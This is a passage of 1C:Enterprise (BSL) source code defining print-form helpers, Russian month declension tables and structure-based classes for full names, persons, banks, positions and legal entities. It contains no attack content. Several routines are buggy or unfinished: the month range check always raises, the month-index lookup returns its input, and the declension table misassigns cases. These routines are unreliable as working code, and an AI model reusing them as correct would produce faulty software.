		ПечатнаяФорма = Новый ТабличныйДокумент;
	#КонецЕсли
	
	Попытка
		Макет_Макет_ВТабличныйДокументПроверитьВывод = ПечатнаяФорма.ПроверитьВывод(Области);
	Исключение
	
		Макет_Макет_ВТабличныйДокументПроверитьВывод = РезультатПриОшибке;
		ВызватьИсключение ""Ошибка при проверке вывода в табличный документ""; // TODO: до первого случая... чтоб понимть в каком случае вызникает. После 
	
	КонецПопытки;
	
	Возврат Макет_Макет_ВТабличныйДокументПроверитьВывод;
	
КонецФункции

Функция Макет_Макет_ВТабличныйДокументВставитьКонецСтраницы(Знач ПечатнаяФорма) Экспорт
	
	Перем Макет_Макет_ВТабличныйДокументВставитьКонецСтраницы; // Возвращаемое значение
	
	ПечатнаяФорма.ВывестиВертикальныйРазделительСтраниц();
	
	Возврат Макет_Макет_ВТабличныйДокументВставитьКонецСтраницы;
	
КонецФункции

// private 

#КонецОбласти //classname_Макет//

#КонецОбласти //namespace_Макет//
#Область namespace_Стандартные
// Helpers
#Область class_Дата


#КонецОбласти

#Область class_Период
Функция Период_ИндексМесяца(Знач Период)
	
	Индексы = Новый Соответствие();
	Индексы.Вставить(""ЯНВАРЬ"", 0);
	Возврат Период
	
	
КонецФункции // Период_ИндексМесяца()
Функция Период_СклонениеМесяца(Знач Период, Знач Падеж)
	
	Перем Период_СклонениеМесяца;
	
	Перем ТипСтрока, ТипДата, ТипЧисло;
	Перем ПериодТип, ПадежТип;
	
	Перем ИндексМесяца, ИндексПадежа;
	
	Перем Склонения;
	
	Склонения = Склонения();
	
	ТипСтрока = Тип(""Строка"");
	ТипДата = Тип(""Дата"");
	ТипЧисло = Тип(""Число"");
	ПериодТип = ТипЗнч(Период); 
	ПадежТип = ТипЗнч(Падеж);
	Если ( ТипДата = ПериодТип ) Тогда
		ИндексМесяца = Месяц(Период) - 1;
	ИначеЕсли ( ТипСтрока = ПериодТип ) Тогда
		ИндексМесяца = Период_ИндексМесяца(Период);
	ИначеЕсли ( ТипЧисло = ПериодТип ) Тогда
		
		Если ( НЕ (ИСТИНА
			И (1 > Период)
			И (12 < Период)
			) ) Тогда
			ВызватьИсключение ""Неверное значение параметра """"Период"""": """""" + Период + """""""";
		КонецЕсли; 
		
		ИндексМесяца = Период - 1;
		
	Иначе
		ВызватьИсключение ""Неожидаемый тип значения параметра """"Период""""("" + ПериодТип + ""): """""" + Период + """""""";
	КонецЕсли; 
	
	Если ( ТипЧисло = ПадежТип ) Тогда
		
		Если ( НЕ (ИСТИНА
			И (1 <= Падеж)
			И (6 >= Падеж)
			) ) Тогда
			ВызватьИсключение ""Неверное значение параметра """"Падеж"""": """""" + Падеж + """""""";
		КонецЕсли;
		
		ИндексПадежа = Падеж - 1;
		
	Иначе
		ВызватьИсключение  ""Неожидаемый тип значения параметра """"Падеж""""("" + ПадежТип + ""): """""" + Падеж + """""" ""
	КонецЕсли; 
	
	Период_СклонениеМесяца = Склонения[ИндексМесяца][ИндексПадежа];
	
	Возврат Период_СклонениеМесяца;
	
КонецФункции // Период_СклонениеМесяца()

#КонецОбласти 
#Область static_class_Склонения

// protected
Функция Склонения() Экспорт
	
	Перем Склонения;
	
	Склонения = Новый Массив();
	
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""январь"",   ""января"",   ""январю"", ""январь"", ""январем"", ""январе"", ""январе""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""февраль"",  ""февраля"",  ""февралю"", ""февраль"", ""февралем"", ""феврале"", ""феврале""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""март"",     ""марта"",    ""марту"", ""март"", ""мартом"", ""марте"", ""марте""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""апрель"",   ""апреля"",   ""апрелю"", ""апрель"", ""апрелем"", ""апреле"", ""апреле""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""май"",      ""мая"",      ""маю"", ""май"", ""маем"", ""мае"", ""мае""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""июнь"",     ""июня"",     ""июню"", ""июнь"", ""июнем"", ""июне"", ""июне""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""июль"",     ""июля"",     ""июлю"", ""июль"", ""июлем"", ""июле"", ""июле""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""август"",   ""августа"",  ""августу"", ""август"", ""августом"", ""августе"", ""августе""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""сентябрь"", ""сентября"", ""сентябрю"", ""сентябрь"", ""сентябрем"", ""сентябре"", ""сентябре""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""октябрь"",  ""октября"",  ""октябрю"", ""октябрь"", ""октябрем"", ""октябре"", ""октябре""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""ноябрь"",   ""ноября"",   ""ноябрю"", ""ноябрь"", ""ноябрем"", ""ноябре"", ""ноябре""));
	Склонения.Добавить(Склонения_ДобавитьСклонение(Новый Массив(7), ""декабрь"",  ""декабря"",  ""декабрю"", ""декабрь"", ""декабрем"", ""декабре"", ""декабре""));
	
	Возврат Склонения;
	
КонецФункции
Функция Склонения_ДобавитьСклонение(Знач Склонение, Знач Именительный, Знач Родительный, Знач Дательный, Знач Винительный, Знач Творительный, Знач Предложный, Знач Местный) Экспорт
	
	Перем Склонения_ДобавитьСклонение;
	
	Склонение[0] = Именительный;
	Склонение[1] = Родительный;
	Склонение[2] = Дательный;
	Склонение[3] = Винительный;
	Склонение[4] = Винительный;
	Склонение[5] = Творительный;
	Склонение[6] = Предложный;
	
	Склонения_ДобавитьСклонение = Склонение;
	
	Возврат Склонения_ДобавитьСклонение;
	
КонецФункции

#КонецОбласти 

// Структуры
#Область class_Стандартные_Адрес

// protected
Функция Стандартные_Адрес(Знач Стандартные_Адрес)
	
	Стандартные_Адрес.Вставить(""Представление"");
	
	Возврат Стандартные_Адрес;
	
КонецФункции
Функция Стандартные_Адрес_Include()
	
	Перем Стандартные_Адрес_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.Адрес"", ""Структура"");
	
	Возврат Стандартные_Адрес_Include;
	
КонецФункции // Стандартные_Адрес_Include

#КонецОбласти //class_Стандартные_Адрес//
#Область class_Стандартные_Документ

// protected
Функция Стандартные_Документ(Знач Стандартные_Документ)
	
	Стандартные_Документ.Вставить(""Ссылка"");
	Стандартные_Документ.Вставить(""Номер"");
	Стандартные_Документ.Вставить(""Дата"");
	
	Возврат Стандартные_Документ;
	
КонецФункции
Функция Стандартные_Документ_Include()
	
	Перем Стандартные_Договор_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.Документ"", ""Структура"");
	
	Возврат Стандартные_Договор_Include;
	
КонецФункции // Стандартные_Договор_Include

#КонецОбласти //class_Стандартные_Договор//
#Область class_Стандартные_Договор

// protected
Функция Стандартные_Договор(Знач Стандартные_Договор)
	
	ООП_parent(Стандартные_Договор);
	
	Возврат Стандартные_Договор;
	
КонецФункции
Функция Стандартные_Договор_Include()
	
	Перем Стандартные_Договор_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.Документ"");
	ООП_ЗарегистрироватьКласс(""Стандартные.Договор"", ""Структура"", ""Стандартные.Документ"");
	
	Возврат Стандартные_Договор_Include;
	
КонецФункции // Стандартные_Договор_Include

#КонецОбласти //class_Стандартные_Договор//
#Область class_Стандартные_ДокументУдостоверяющийЛичность

// public
Функция Стандартные_ДокументУдостоверяющийЛичность_Представление(Знач this)
	
	Перем Стандартные_ДокументУдостоверяющийЛичность_Представление;
	
	Стандартные_ДокументУдостоверяющийЛичность_Представление = this.Представление;
	
	Возврат Стандартные_ДокументУдостоверяющийЛичность_Представление;
	
КонецФункции	
// protected
Функция Стандартные_ДокументУдостоверяющийЛичность(Знач Стандартные_ДокументУдостоверяющийЛичность)
	
	Стандартные_ДокументУдостоверяющийЛичность.Вставить(""Ссылка"");
	Стандартные_ДокументУдостоверяющийЛичность.Вставить(""Представление"");
	Стандартные_ДокументУдостоверяющийЛичность.Вставить(""Вид"");
	Стандартные_ДокументУдостоверяющийЛичность.Вставить(""Серия"");
	Стандартные_ДокументУдостоверяющийЛичность.Вставить(""Номер"");
	Стандартные_ДокументУдостоверяющийЛичность.Вставить(""КемВыдан"");
	Стандартные_ДокументУдостоверяющийЛичность.Вставить(""ДатаВыдачи"");
	
	Возврат Стандартные_ДокументУдостоверяющийЛичность;
	
КонецФункции
Функция Стандартные_ДокументУдостоверяющийЛичность_Include()
	
	Перем Стандартные_ДокументУдостоверяющийЛичность_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ДокументУдостоверяющийЛичность"", ""Структура"");
	
	Возврат Стандартные_ДокументУдостоверяющийЛичность_Include;
	
КонецФункции // Стандартные_ДокументУдостоверяющийЛичность_Include

#КонецОбласти //class_Стандартные_ДокументУдостоверяющийЛичность//
#Область class_Стандартные_Должность

// public
Функция Стандартные_Должность_Наименование(Знач Должность, Значение = Неопределено) Экспорт
	
	Перем Стандартные_Должность_Наименование; // Возвращаемое значение
	
	Если ( Неопределено <> Значение ) Тогда
		
		Должность.Наименование = Значение;
		
		Стандартные_Должность_Обновить(Должность);
		
	КонецЕсли;	
	
	Стандартные_Должность_Наименование = Должность.Наименование;
	
	Возврат Стандартные_Должность_Наименование;
	
КонецФункции
Функция Стандартные_Должность_Представление(Знач Должность) Экспорт
	
	Перем Стандартные_Должность_Представление; // Возвращаемое значение
	
	Стандартные_Должность_Представление = Стандартные_Должность_Наименование(Должность);
	
	Возврат Стандартные_Должность_Представление;
	
КонецФункции
Функция Стандартные_Должность_Склонение(Знач Должность, Знач Падеж = Неопределено, Знач Объект = Неопределено) Экспорт
	
	Перем Стандартные_Должность_Склонение; // Возвращаемое значение
	
	Наименование = Стандартные_Должность_Наименование(Должность);
	
	Стандартные_Должность_Склонение = СклонениеПредставленийОбъектов.ПросклонятьПредставление(Наименование, Падеж, Объект);
	
	Возврат Стандартные_Должность_Склонение;
	
КонецФункции // Стандартные_Должность_Установить()

// protected
Функция Стандартные_Должность(Знач Стандартные_Должность)
	
	Стандартные_Должность.Вставить(""Ссылка"", Неопределено);
	Стандартные_Должность.Вставить(""Представление"", """");
	Стандартные_Должность.Вставить(""Наименование"", """");
	
	Возврат Стандартные_Должность;
	
КонецФункции
Функция Стандартные_Должность_Include()
	
	Перем Стандартные_Должность_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.Должность"", ""Структура"");		
	
	Возврат Стандартные_Должность_Include;
	
КонецФункции // Стандартные_Должность_Include
Функция Стандартные_Должность_Обновить(Знач Должность)
	
	Перем Стандартные_Должность_Обновить; // Возвращаемое значение
	
	Стандартные_Должность_Обновить = Истина;
	
	Возврат Стандартные_Должность_Обновить;
	
КонецФункции

#КонецОбласти //class_Стандартные_Должность//
#Область class_Стандартные_ЕГРИП

// protected
Функция Стандартные_ЕГРИП(Знач Стандартные_ЕГРИП)
	
	Стандартные_ЕГРИП.Вставить(""НомерИП"");
	Стандартные_ЕГРИП.Вставить(""ДатаВыдачи"");
	Стандартные_ЕГРИП.Вставить(""СерияНомер"");
	
	Возврат Стандартные_ЕГРИП;
	
КонецФункции
Функция Стандартные_ЕГРИП_Include()
	
	Перем Стандартные_ЕГРИП_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ЕГРИП"", ""Структура"");
	
	Возврат Стандартные_ЕГРИП_Include;
	
КонецФункции // Стандартные_ЕГРИП_Include

#КонецОбласти //class_Стандартные_ЕГРИП//
#Область class_Стандартные_Номенклатура

// public

Функция Стандартные_Номенклатура(Знач Стандартные_Номенклатура)
	
	Стандартные_Номенклатура.Вставить(""Ссылка"");
	Стандартные_Номенклатура.Вставить(""Код"");
	Стандартные_Номенклатура.Вставить(""Наименование"");
	Стандартные_Номенклатура.Вставить(""ЕдиницаИзмерения"", ООП_new(""Стандартные.ЕдиницаИзмерения""));
	
	Возврат Стандартные_Номенклатура;
	
КонецФункции

Функция Стандартные_Номенклатура_Представление(Знач this) Экспорт
	
	Перем Стандартные_Номенклатура_Представление;
	
	Стандартные_Номенклатура_Представление = ЭтотОбъект.Стандартные_Подразделение_Наименование(this);
	
	Возврат Стандартные_Номенклатура_Представление;
	
КонецФункции
Функция Стандартные_Номенклатура_Код(Знач this) Экспорт
	
	Перем Стандартные_Номенклатура_Представление;
	
	Стандартные_Номенклатура_Представление = this.Код;
	
	Возврат Стандартные_Номенклатура_Представление;
	
КонецФункции
Функция Стандартные_Номенклатура_Наименование(Знач this) Экспорт
	
	Перем Стандартные_Номенклатура_Представление;
	
	Стандартные_Номенклатура_Представление = this.Наименование;
	
	Возврат Стандартные_Номенклатура_Представление;
	
КонецФункции
// protected
Функция Стандартные_Номенклатура_Include()
	
	Перем Стандартные_Номенклатура_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.ЕдиницаИзмерения"");
	
	ООП_ЗарегистрироватьКласс(""Стандартные.Номенклатура"", ""Структура"");
	
	Возврат Стандартные_Номенклатура_Include;
	
КонецФункции // Стандартные_Номенклатура_Include

#КонецОбласти //class_Стандартные_Номенклатура//
#Область class_Стандартные_ЕдиницаИзмерения

// protected
Функция Стандартные_ЕдиницаИзмерения(Знач Стандартные_ЕдиницаИзмерения)
	
	Стандартные_ЕдиницаИзмерения.Вставить(""Ссылка"");
	Стандартные_ЕдиницаИзмерения.Вставить(""Код"", """");
	Стандартные_ЕдиницаИзмерения.Вставить(""Наименование"", """");
	
	Возврат Стандартные_ЕдиницаИзмерения;
	
КонецФункции
Функция Стандартные_ЕдиницаИзмерения_Include()
	
	Перем Стандартные_ЕдиницаИзмерения_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ЕдиницаИзмерения"", ""Структура"");		
	
	Возврат Стандартные_ЕдиницаИзмерения_Include;
	
КонецФункции // Стандартные_ЕдиницаИзмерения_Include

#КонецОбласти //class_Стандартные_ЕдиницаИзмерения//
#Область class_Стандартные_Подразделение
// public
Функция Стандартные_Подразделение_Наименование(Знач Подразделение, Значение = Неопределено) Экспорт
	
	Перем Стандартные_Подразделение_Наименование; // Возвращаемое значение
	
	Если ( Неопределено <> Значение ) Тогда
		Подразделение.Наименование = Значение;
	КонецЕсли; 
	
	Стандартные_Подразделение_Наименование = Подразделение.Наименование;
	
	Возврат Стандартные_Подразделение_Наименование;
	
КонецФункции
Функция Стандартные_Подразделение_Представление(Знач Подразделение) Экспорт
	
	Перем Стандартные_Подразделение_Представление; // Возвращаемое значение
	
	Стандартные_Подразделение_Представление = ЭтотОбъект.Стандартные_Подразделение_Наименование(Подразделение);
	
	Возврат Стандартные_Подразделение_Представление;
	
КонецФункции
// protected
Функция Стандартные_Подразделение(Знач Стандартные_Подразделение)
	
	Стандартные_Подразделение.Вставить(""Ссылка"");
	Стандартные_Подразделение.Вставить(""Наименование"");
	
	Возврат Стандартные_Подразделение;
	
КонецФункции
Функция Стандартные_Подразделение_Include()
	
	Перем Стандартные_Подразделение_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.Подразделение"", ""Структура"");		
	
	Возврат Стандартные_Подразделение_Include;
	
КонецФункции // Стандартные_Подразделение_Include

#КонецОбласти //class_Стандартные_Подразделение//
#Область class_Стандартные_ФизическоеЛицо

// public
Функция Стандартные_ФизическоеЛицо(Знач Стандартные_ФизическоеЛицо) Экспорт
	
	Стандартные_ФизическоеЛицо.Вставить(""Ссылка"");
	Стандартные_ФизическоеЛицо.Вставить(""Должность"",  ООП_new(""Стандартные.Должность""));
	Стандартные_ФизическоеЛицо.Вставить(""ФИО"",        ООП_new(""Стандартные.ФИО""));
	Стандартные_ФизическоеЛицо.Вставить(""Пол"");
	
	Возврат Стандартные_ФизическоеЛицо;
	
КонецФункции
Функция Стандартные_ФизическоеЛицо_Представление(Знач this)
	Перем Стандартные_ФизическоеЛицо_Представление; // Возвращаемое значение
	
	Стандартные_ФизическоеЛицо_Представление = Стандартные_ФИО_ФамилияИмяОтчество(this.ФИО);
	
	Возврат Стандартные_ФизическоеЛицо_Представление;
	
КонецФункции

Функция Стандартные_ФизическоеЛицо_Include()
	
	Перем Стандартные_ФизическоеЛицо_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.Должность"");
	ООП_include(""Стандартные.ФИО"");
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ФизическоеЛицо"", ""Структура"");		
	
	Возврат Стандартные_ФизическоеЛицо_Include;
	
КонецФункции // Стандартные_ФизическоеЛицо_Include

#КонецОбласти //class_Стандартные_ФизическоеЛицо//
#Область class_Стандартные_РасчетныйСчет

// protected
Функция Стандартные_РасчетныйСчет(Знач Стандартные_РасчетныйСчет)
	
	Стандартные_РасчетныйСчет.Вставить(""Номер"");
	Стандартные_РасчетныйСчет.Вставить(""Банк"", ООП_new(""Стандартные.Банк""));
	
	Возврат Стандартные_РасчетныйСчет;
	
КонецФункции
Функция Стандартные_РасчетныйСчет_Include()
	
	Перем Стандартные_РасчетныйСчет_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.Банк"");
	
	ООП_ЗарегистрироватьКласс(""Стандартные.РасчетныйСчет"", ""Структура"");		
	
	Возврат Стандартные_РасчетныйСчет_Include;
	
КонецФункции // Стандартные_РасчетныйСчет_Include

#КонецОбласти //class_Стандартные_РасчетныйСчет//
#Область class_Стандартные_Банк

// protected
Функция Стандартные_Банк(Знач Стандартные_Банк)
	
	Стандартные_Банк.Вставить(""Наименование"");
	Стандартные_Банк.Вставить(""БИК"");
	Стандартные_Банк.Вставить(""Город"");
	Стандартные_Банк.Вставить(""КорреспондентскийСчет"");
	
	Возврат Стандартные_Банк;
	
КонецФункции
Функция Стандартные_Банк_Include()
	
	Перем Стандартные_Банк_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.Банк"", ""Структура"");		
	
	Возврат Стандартные_Банк_Include;
	
КонецФункции // Стандартные_Банк_Include

#КонецОбласти //class_Стандартные_Банк//
#Область class_Стандартные_Спецификация

// protected
Функция Стандартные_Спецификация(Знач Стандартные_Спецификация)
	
	Стандартные_Спецификация.Вставить(""Строки"", Новый Массив);
	
	Возврат Стандартные_Спецификация;
	
КонецФункции
Функция Стандартные_Спецификация_Include()
	
	Перем Стандартные_Спецификация_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.СтрокаСпецификации"");
	ООП_ЗарегистрироватьКласс(""Стандартные.Спецификация"", ""Структура"");		
	
	Возврат Стандартные_Спецификация_Include;
	
КонецФункции // Стандартные_Спецификация_Include

#КонецОбласти //class_Стандартные_Спецификация//
#Область class_Стандартные_СтрокаСпецификации

// protected
Функция Стандартные_СтрокаСпецификации(Знач Стандартные_СтрокаСпецификации)
	
	Стандартные_СтрокаСпецификации.Вставить(""НомерСтроки"");
	Стандартные_СтрокаСпецификации.Вставить(""Наименование"");
	Стандартные_СтрокаСпецификации.Вставить(""ЕдиницаИзмерения"");
	Стандартные_СтрокаСпецификации.Вставить(""Цена"");
	Стандартные_СтрокаСпецификации.Вставить(""Количество"");
	Стандартные_СтрокаСпецификации.Вставить(""Сумма"");
	
	Возврат Стандартные_СтрокаСпецификации;
	
КонецФункции
Функция Стандартные_СтрокаСпецификации_Include()
	
	Перем Стандартные_СтрокаСпецификации_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.СтрокаСпецификации"", ""Структура"");		
	
	Возврат Стандартные_СтрокаСпецификации_Include;
	
КонецФункции // Стандартные_СпецификацияСтрока_Include

#КонецОбласти //class_Стандартные_СтрокаСпецификации/
#Область class_Стандартные_ФИО
// public
Функция Стандартные_ФИО_Фамилия(Знач ФИО, Значение = Неопределено) Экспорт
	
	Перем Стандартные_ФИО_Фамилия; // Возвращаемое значение
	
	Если ( Неопределено <> Значение ) Тогда
		
		ФИО.Фамилия = Значение;
		
		Стандартные_ФИО_Обновить(ФИО);
		
	КонецЕсли;	
	
	Стандартные_ФИО_Фамилия = ФИО.Фамилия;
	
	Возврат Стандартные_ФИО_Фамилия;
	
КонецФункции
Функция Стандартные_ФИО_Имя(Знач ФИО, Значение = Неопределено) Экспорт
	
	Перем Стандартные_ФИО_Имя; // Возвращаемое значение
	
	Если ( Неопределено <> Значение ) Тогда
		
		ФИО.Имя = Значение;
		
		Стандартные_ФИО_Обновить(ФИО);
		
	КонецЕсли;	
	
	Стандартные_ФИО_Имя = ФИО.Имя;
	
	Возврат Стандартные_ФИО_Имя;
	
КонецФункции
Функция Стандартные_ФИО_Отчество(Знач ФИО, Значение = Неопределено) Экспорт
	
	Перем Стандартные_ФИО_Отчество; // Возвращаемое значение
	
	Если ( Неопределено <> Значение ) Тогда
		
		ФИО.Отчество = Значение;
		
		Стандартные_ФИО_Обновить(ФИО);
		
	КонецЕсли;	
	
	Стандартные_ФИО_Отчество = ФИО.Отчество;
	
	Возврат Стандартные_ФИО_Отчество;
	
КонецФункции
Функция Стандартные_ФИО_ФамилияИО(Знач ФИО) Экспорт
	
	Перем Стандартные_ФИО_ФамилияИО; // Возвращаемое значение
	
	Стандартные_ФИО_ФамилияИО = ФИО.ФамилияИО;
	
	Возврат Стандартные_ФИО_ФамилияИО;
	
КонецФункции
Функция Стандартные_ФИО_ИОФамилия(Знач ФИО) Экспорт 
	
	Перем Стандартные_ФИО_ИОФамилия; // Возвращаемое значение
	
	Стандартные_ФИО_ИОФамилия = ФИО.ИОФамилия;
	
	Возврат Стандартные_ФИО_ИОФамилия;
	
КонецФункции
Функция Стандартные_ФИО_ФамилияИмяОтчество(Знач ФИО) Экспорт
	
	Перем Стандартные_ФИО_ФамилияИмяОтчество; // Возвращаемое значение
	
	Стандартные_ФИО_ФамилияИмяОтчество = ФИО.ФамилияИмяОтчество;
	
	Возврат Стандартные_ФИО_ФамилияИмяОтчество;
	
КонецФункции
Функция Стандартные_ФИО_Установить(Знач ФИО, Знач Значение) Экспорт
	
	Перем Стандартные_ФИО_Установить; // Возвращаемое значение
	Перем ЗначениеТип;
	Перем Части, КоличествоЧастей;
	
	Стандартные_ФИО_Установить = ФИО;
	
	Если ( Неопределено = Значение ) Тогда
		Возврат Стандартные_ФИО_Установить;
	КонецЕсли; 
	
	ЗначениеТип = ТипЗнч(Значение);
	ТипСтрока = Тип(""Строка"");
	ТипСтруктура = Тип(""Структура"");
	ТипСтрокаТаблицаЗначений = Тип(""СтрокаТаблицыЗначений"");
	
	Если (
		ЛОЖЬ
		ИЛИ ( ТипСтруктура = ЗначениеТип )
		ИЛИ ( ТипСтрокаТаблицаЗначений = ЗначениеТип ) )Тогда
		
		ФИО.Фамилия   = ?(Неопределено = Значение.Фамилия, """", Значение.Фамилия);
		ФИО.Имя       = ?(Неопределено = Значение.Имя, """", Значение.Имя);
		ФИО.Отчество  = ?(Неопределено = Значение.Отчество, """", Значение.Отчество);
		
	ИначеЕсли ( ТипСтрока = ЗначениеТип ) Тогда
		
		ФИО.Фамилия   = """";
		ФИО.Имя       = """";
		ФИО.Отчество  = """";

		Части = СтроковыеФункцииКлиентСервер.РазложитьСтрокуВМассивСлов(Значение, "" .""); // Версия < 8.3.6
		//Части = СтрРазделить(Значение, "" ."", Истина); // Версия >= 8.3.6
		
		КоличествоЧастей = Части.Количество();
		Если ( 0 < КоличествоЧастей ) Тогда
			ФИО.Фамилия = Части[0];
			Если ( 1 < КоличествоЧастей ) Тогда
				ФИО.Имя = Части[1];
				Если ( 2 < КоличествоЧастей ) Тогда
					ФИО.Отчество = Части[2];
				КонецЕсли; 
			КонецЕсли; 
		КонецЕсли;
		
	Иначе
		ВызватьИсключение ""Отсутствует реализация функции """"Стандартные_ФИО_Установить"""" для типа """""" + ЗначениеТип + """"""переменной """"Значение""""."";
	КонецЕсли; 
	
	Стандартные_ФИО_Обновить(ФИО);
	Стандартные_ФИО_Установить = ФИО;
	
	Возврат Стандартные_ФИО_Установить;
	
КонецФункции // Стандартные_ФИО_Установить()
Функция Стандартные_ФИО_Склонение(Знач ФИО, Знач Падеж = Неопределено, Знач Объект = Неопределено, Знач Пол = Неопределено) Экспорт

	Перем Стандартные_ФИО_Склонение; // Возвращаемое значение
	Перем Фамилия, Имя, Отчество;
	
	Стандартные_ФИО_Склонение = СклонениеПредставленийОбъектов.ПросклонятьФИО(Стандартные_ФИО_ФамилияИмяОтчество(ФИО), Падеж, Объект, Перечисления.ПолФизическогоЛица.Индекс(Пол) + 1); // accounting 3.0
	
	Возврат Стандартные_ФИО_Склонение;
	
КонецФункции // Стандартные_ФИО_Установить()
// protected
Функция Стандартные_ФИО(Знач ФИО)
	
	ФИО.Вставить(""Фамилия"", """");
	ФИО.Вставить(""Имя"", """");
	ФИО.Вставить(""Отчество"", """");
	ФИО.Вставить(""ФамилияИмяОтчество"", """");
	ФИО.Вставить(""ФамилияИО"", """");
	ФИО.Вставить(""ИОФамилия"", """");
	
	Возврат ФИО;
	
КонецФункции
Функция Стандартные_ФИО_Include()
	
	Перем Стандартные_Спецификация_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ФИО"", ""Структура"");
	
	Возврат Стандартные_Спецификация_Include;
	
КонецФункции // Стандартные_Спецификация_Include
Функция Стандартные_ФИО_Обновить(Знач ФИО)
	
	Перем Стандартные_ФИО_Обновить; // Возвращаемое значение
	
	Перем ЕстьФамилия;
	Перем ЕстьИмя;
	Перем ЕстьОтчество;
	
	Стандартные_ФИО_Обновить = Истина;
	
	ЕстьФамилия    = НЕ ПустаяСтрока(ФИО.Фамилия);
	ЕстьИмя       = НЕ ПустаяСтрока(ФИО.Имя);
	ЕстьОтчество  = НЕ ПустаяСтрока(ФИО.Отчество);
	
	ФИО.ФамилияИО = """"
	+ ?(ЕстьФамилия, ФИО.Фамилия, """")
	+ ?(ЕстьИмя, ?(ЕстьФамилия, "" "", """") + Лев(ФИО.Имя, 1) + ""."", """")
	+ ?(ЕстьОтчество, ?(ЕстьИмя, """", ?(ЕстьФамилия, "" "", """")) + Лев(ФИО.Отчество, 1) + ""."", """")
	; 
	
	ФИО.ИОФамилия = """"
	+ ?(ЕстьИмя, Лев(ФИО.Имя, 1) + ""."", """")
	+ ?(ЕстьОтчество, Лев(ФИО.Отчество, 1) + ""."", """")
	+ ?(ЕстьФамилия, ?(ЕстьФамилия ИЛИ ЕстьОтчество, "" "", """") + ФИО.Фамилия, """")
	; 
	
	ФИО.ФамилияИмяОтчество = """"
	+ ?(ЕстьФамилия, ФИО.Фамилия, """")
	+ ?(ЕстьИмя, ?(ЕстьФамилия, "" "", """") + ФИО.Имя, """")
	+ ?(ЕстьОтчество, ?(ЕстьФамилия ИЛИ ЕстьИмя, "" "", """") + ФИО.Отчество, """")
	; 
	
	Возврат Стандартные_ФИО_Обновить;
	
КонецФункции

#КонецОбласти //class_Стандартные_ФИО//
#Область class_Стандартные_ЮрФизЛицо
// public
Функция Стандартные_ЮрФизЛицо_Наименование(Знач this, Знач Вид = ""Краткое"")

	Перем Стандартные_ЮрФизЛицо_Наименование; // Возвращаемое значение
	
	Стандартные_ЮрФизЛицо_Наименование = this.Наименования[Вид];
	
	Возврат Стандартные_ЮрФизЛицо_Наименование;
	
КонецФункции // Стандартные_ЮрФизЛицо_Представление()
Функция Стандартные_ЮрФизЛицо_Представление(Знач this)
	
	Перем Стандартные_ЮрФизЛицо_Представление; // Возвращаемое значение
	
	Если ( Неопределено = this.Представление) Тогда
		Стандартные_ЮрФизЛицо_Представление = Стандартные_ЮрФизЛицо_Наименование(this, this.ВидПредставления);
	Иначе
		Стандартные_ЮрФизЛицо_Представление = this.Представление;
	КонецЕсли; 
	
	Возврат Стандартные_ЮрФизЛицо_Представление;
	
КонецФункции // Стандартные_ЮрФизЛицо_Представление()

// protected
Функция Стандартные_ЮрФизЛицо(Знач this)
	
	this.Вставить(""Ссылка"");
	this.Вставить(""Представление"", Неопределено);
	
	this.Вставить(""Описание"");
	this.Вставить(""ИНН"");
	this.Вставить(""КПП"");
	this.Вставить(""КодПоОКПО"");
	this.Вставить(""ОГРН"");
	this.Вставить(""ЕГРИП"",              ООП_new(""Стандартные.ЕГРИП""));
	this.Вставить(""Наименования"",       ООП_new(""Стандартные.НаименованияЮрФизЛица""));
	
	this.Вставить(""ОтветственныеЛица"",  ООП_new(""Стандартные.ФизическиеЛица""));
	this.ОтветственныеЛица.Вставить(""Руководитель"", ООП_new(""Стандартные.ФизическоеЛицо""));
	this.ОтветственныеЛица.Вставить(""ГлавныйБухгалтер"", ООП_new(""Стандартные.ФизическоеЛицо""));
	
	this.Вставить(""Адреса"",             ООП_new(""Стандартные.Адреса""));
	this.Вставить(""РасчетныйСчет"",      ООП_new(""Стандартные.РасчетныйСчет""));
	this.Вставить(""ВидПредставления"", ""Краткое"");
	Возврат this;
	
КонецФункции
Функция Стандартные_ЮрФизЛицо_Include()
	
	Перем Стандартные_ЮрФизЛицо_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.ЕГРИП"");
	ООП_include(""Стандартные.НаименованияЮрФизЛица"");
	ООП_include(""Стандартные.ФизическиеЛица"");
	ООП_include(""Стандартные.Адреса"");
	ООП_include(""Стандартные.РасчетныйСчет"");
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ЮрФизЛицо"", ""Структура"");
	
	Возврат Стандартные_ЮрФизЛицо_Include;
	
КонецФункции // Стандартные_ЮрФизЛицо_Include

#КонецОбласти //class_Стандартные_ЮрФизЛицо//
#Область class_Стандартные_ТранспортноеСредство

// public
